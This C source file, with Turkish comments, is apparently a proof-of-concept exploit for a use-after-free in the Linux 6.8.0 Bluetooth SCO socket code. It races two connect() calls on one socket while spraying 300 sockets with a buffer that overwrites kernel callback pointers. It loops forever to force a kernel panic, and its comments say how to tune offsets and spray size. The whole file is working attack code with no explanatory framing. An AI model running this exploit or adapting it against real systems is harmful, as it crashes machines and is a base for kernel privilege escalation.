#define _GNU_SOURCE
#include <pthread.h>
#include <sched.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/sco.h>
#include <stdio.h>

#define FAKE_FUNC_ADDR 0xffffffffdeadbeef //overwrite icin adres (kernel crash icin, isterseniz 4141...)
#define SPRAY_COUNT 300 //genisletebilirsin slab overwrite icin
#define SPRAY_BUFFER_SIZE 0x300
#define SK_STATE_CHANGE_OFFSET 0x2a0 //doğru offsetleri çekirdek sürümünüze göre ayarlamaniz gerekiyor
#define SK_DATA_READY_OFFSET 0X2a8
#define SK_WRITE_SPACE_OFFSET 0X2b0

int fd;
int spray_sockets[SPRAY_COUNT];
char spray_buffer[SPRAY_BUFFER_SIZE];

void pin_to_cpu(int cpu) {
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(cpu, &cpuset);
    sched_setaffinity(0, sizeof(cpuset), &cpuset);

    struct sched_param sp;
    sp.sched_priority = 99;
    pthread_setschedparam(pthread_self(), SCHED_FIFO, &sp);
}

void prepare_spray_buffer() {
    memset(spray_buffer, 'A', SPRAY_BUFFER_SIZE);
    *(unsigned long *)(spray_buffer + SK_STATE_CHANGE_OFFSET) = FAKE_FUNC_ADDR;
    *(unsigned long *)(spray_buffer + SK_DATA_READY_OFFSET) = FAKE_FUNC_ADDR;
    *(unsigned long *)(spray_buffer + SK_WRITE_SPACE_OFFSET) = FAKE_FUNC_ADDR;

     
    printf("[*] Spray buffer sk_state_change @ offset 0x%lx -> 0x%lx\n",
           (unsigned long)SK_STATE_CHANGE_OFFSET, FAKE_FUNC_ADDR);
    printf("[*] Spray buffer sk_ready_offset @ offset 0x%lx -> 0x%lx\n",
           (unsigned long)SK_DATA_READY_OFFSET, FAKE_FUNC_ADDR);
    printf("[*] Spray buffer sk_write_space_offset @ offset 0x%lx -> 0x%lx\n",
           (unsigned long)SK_WRITE_SPACE_OFFSET, FAKE_FUNC_ADDR);
}

void *connect1(void *arg) {
    pin_to_cpu(0);
    usleep(500);
    struct sockaddr_sco sa;
    memset(&sa, 0, sizeof(sa));
    sa.sco_family = AF_BLUETOOTH;
    connect(fd, (struct sockaddr *)&sa, sizeof(sa));
    return NULL;
}

void *connect2(void *arg) {
    pin_to_cpu(0);
    usleep(1000);
    struct sockaddr_sco sa;
    memset(&sa, 0xff, sizeof(sa));
    sa.sco_family = AF_BLUETOOTH;
    connect(fd, (struct sockaddr *)&sa, sizeof(sa));
    return NULL;
}

void *spray(void *arg) {
    pin_to_cpu(0);
    for (int i = 0; i < SPRAY_COUNT; i++) {
        spray_sockets[i] = socket(AF_BLUETOOTH, SOCK_SEQPACKET | SOCK_NONBLOCK, BTPROTO_SCO);
        if (spray_sockets[i] < 0) {
            perror("socket (spray)");
            exit(EXIT_FAILURE);
        }
        setsockopt(spray_sockets[i], SOL_SCO, BT_PKT_STATUS, spray_buffer, sizeof(spray_buffer));
    }
    return NULL;
}

void cleanup_spray() {
    for (int i = 0; i < SPRAY_COUNT; i++) {
        if (spray_sockets[i] > 0) {
            close(spray_sockets[i]);
            spray_sockets[i] = -1;
        }
    }
}

void trigger_uaf() {
    pthread_t t1, t2, t3;

    fd = socket(AF_BLUETOOTH, SOCK_SEQPACKET | SOCK_NONBLOCK, BTPROTO_SCO);
    if (fd < 0) {
        perror("SCO socket creation failed");
        exit(EXIT_FAILURE);
    }

    prepare_spray_buffer();
    pin_to_cpu(0);

    pthread_create(&t1, NULL, spray, NULL);
    pthread_create(&t2, NULL, connect1, NULL);
    pthread_create(&t3, NULL, connect2, NULL);

    pthread_join(t1, NULL);
    pthread_join(t2, NULL);
    pthread_join(t3, NULL);

    // Doğrulama (kernel panic ile)
    printf("[*] Triggering UAF... Check dmesg for kernel panic.\n");

    cleanup_spray();
    close(fd);
}

int main() {
    printf("[*] Starting Linux 6.8.0 SCO SEF UAF Exploit\n");

    while (1) {
        trigger_uaf();
        usleep(100000);
    }

    return 0;
}
